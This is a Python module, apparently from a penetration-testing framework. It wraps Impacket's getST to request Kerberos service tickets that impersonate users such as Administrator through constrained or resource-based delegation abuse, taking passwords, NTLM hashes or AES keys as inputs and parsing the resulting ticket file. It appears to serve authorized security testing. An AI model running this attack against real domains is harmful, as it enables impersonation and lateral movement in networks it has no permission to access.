"""
Impacket getST Module (S4U service-ticket request / delegation abuse).

Requests a service ticket on behalf of another principal using S4U2self +
S4U2proxy. This is the abuse step for constrained delegation and resource-based
constrained delegation (RBCD): with control of an account trusted for
delegation, forge a ticket impersonating a high-value user to a target SPN.
Maps the OCD AD mind-map `delegation` / `lat_move` categories.
"""

from .common import ImpacketAdapter, observation


class ImpacketGetSTModule(ImpacketAdapter):
    """
    Impacket getST — S4U2self/S4U2proxy service-ticket request.

    Given credentials for an account allowed to delegate (constrained or RBCD),
    request a service ticket for ``-spn`` impersonating ``-impersonate``. The
    resulting .ccache can be used (KRB5CCNAME) to access the target service.
    """

    def __init__(self, framework):
        super().__init__(framework)
        self.tool_name = "impacket-getST"

    @property
    def name(self) -> str:
        return "Impacket getST (S4U delegation abuse)"

    @property
    def description(self) -> str:
        return "Request an S4U2self/S4U2proxy service ticket impersonating another user (constrained/RBCD)"

    @property
    def author(self) -> str:
        return "PurpleSploit Team"

    @property
    def category(self) -> str:
        return "impacket"

    emits = ("credential", "resource")

    def _init_options(self):
        super()._init_options()
        self.options.update({
            "RHOST": {
                "value": None, "required": True,
                "description": "KDC / Domain Controller IP", "default": None,
            },
            "USERNAME": {
                "value": None, "required": True,
                "description": "Controlled account allowed to delegate", "default": None,
            },
            "PASSWORD": {
                "value": None, "required": False,
                "description": "Password for the controlled account", "default": None,
            },
            "DOMAIN": {
                "value": None, "required": True,
                "description": "Domain name (e.g., CORP.LOCAL)", "default": None,
            },
            "HASH": {
                "value": None, "required": False,
                "description": "NTLM hash (LM:NT) for the controlled account", "default": None,
            },
            "AESKEY": {
                "value": None, "required": False,
                "description": "AES key for the controlled account (-aesKey)", "default": None,
            },
            "SPN": {
                "value": None, "required": False,
                "description": "Target SPN for S4U2proxy (e.g., cifs/host.corp.local); "
                               "omit for an S4U2self-only ticket",
                "default": None,
            },
            "IMPERSONATE": {
                "value": None, "required": True,
                "description": "User to impersonate (e.g., Administrator)", "default": None,
            },
            "DC_IP": {
                "value": None, "required": False,
                "description": "Domain Controller IP (if different from RHOST)", "default": None,
            },
        })

    def build_argv(self) -> list[str]:
        """Build the impacket-getST argv (auth target + S4U flags + DC IP)."""
        cmd = self.authentication_argv(remote=False)
        aeskey = self.get_option("AESKEY")
        if aeskey:
            cmd += ["-aesKey", str(aeskey)]
        spn = self.get_option("SPN")
        if spn:
            cmd += ["-spn", str(spn)]
        impersonate = self.get_option("IMPERSONATE")
        if impersonate:
            cmd += ["-impersonate", str(impersonate)]
        dc = self.get_option("DC_IP") or self.get_option("RHOST")
        if dc:
            cmd += ["-dc-ip", str(dc)]
        return cmd

    def parse_output(self, output: str) -> dict:
        """Parse getST output for the saved ccache ticket."""
        results = {
            "success": False,
            "ticket_file": None,
            "observations": [],
            "credentials": [],
        }
        domain = self.get_option("DOMAIN")
        impersonate = self.get_option("IMPERSONATE")
        spn = self.get_option("SPN")
        for line in output.splitlines():
            stripped = line.strip()
            # Tolerate both "Saving ticket in" (0.13) and "Saving/Updating ticket in" (master).
            if "ticket in" in stripped and ("Saving" in stripped or "Updating" in stripped):
                ticket = stripped.split("ticket in", 1)[1].strip()
                results["ticket_file"] = ticket
                results["success"] = True
                results["observations"].append(observation(
                    "credential", spn or domain, impersonated=impersonate, spn=spn,
                    domain=domain, ticket_file=ticket, credential_type="kerberos_ticket",
                    source=self.tool_name))
                results["observations"].append(observation(
                    "resource", ticket, resource_type="kerberos_ccache",
                    impersonated=impersonate, spn=spn, domain=domain))
        return results

    def run(self):
        """Gate success on an actually-saved ticket.

        getST can exit 0 while the KDC rejected the S4U request (e.g.
        KDC_ERR_BADOPTION), so exit code alone is not evidence of a ticket. Treat
        the run as successful only when the parser confirmed a saved ccache.
        """
        result = super().run()
        if isinstance(result, dict):
            parsed = result.get("parsed") or {}
            result["success"] = bool(result.get("success")) and bool(parsed.get("success"))
        return result
